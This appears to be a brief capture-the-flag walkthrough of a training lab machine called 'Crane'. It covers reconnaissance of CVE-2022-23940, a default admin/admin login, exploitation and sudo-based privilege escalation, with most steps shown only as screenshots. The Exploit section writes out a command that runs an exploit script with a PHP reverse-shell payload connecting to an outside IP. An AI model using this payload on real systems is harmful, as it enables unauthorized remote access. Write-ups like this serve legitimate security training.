https://portal.offsec.com/machine/crane-52178/overview

## Introduce

![image](_assets/SyKKLYwvee.png)

## Reconnaissance
* CVE-2022-23940

  ![image](_assets/SkYl9FDvel.png)

* nmap

  ![image](_assets/SygJutvvlx.png)

* web page

  ![image](_assets/r1E-dKPvxx.png)

  ![image](_assets/rkvrutDwxg.png)

    * password guess
    `admin` & `admin`

      ![image](_assets/B1G0ttDPex.png)

## Walk Through
* Account Page

  ![image](_assets/rkmFqtPDel.png)

* About

  ![image](_assets/ry_72tDPgx.png)

  ![image](_assets/SksEntPPxg.png)

## Exploit

![image](_assets/ry8U6tPvxl.png)

`./exploit.py -h http://192.168.230.146/ -u admin -p admin --payload "php -r '\$sock=fsockopen(\"192.168.45.207\", 9962); exec(\"/bin/sh -i <&3 >&3 2>&3\");'"`

![image](_assets/r1GqRFPvle.png)

![image](_assets/S1To0YvPxe.png)

## Privilege escalation
* sudo -l

  ![image](_assets/BklR1cDPlg.png)

  ![image](_assets/r1RMg9wDel.png)

  ![image](_assets/r17dgqPDxx.png)

  ![image](_assets/S1K3x5vDex.png)
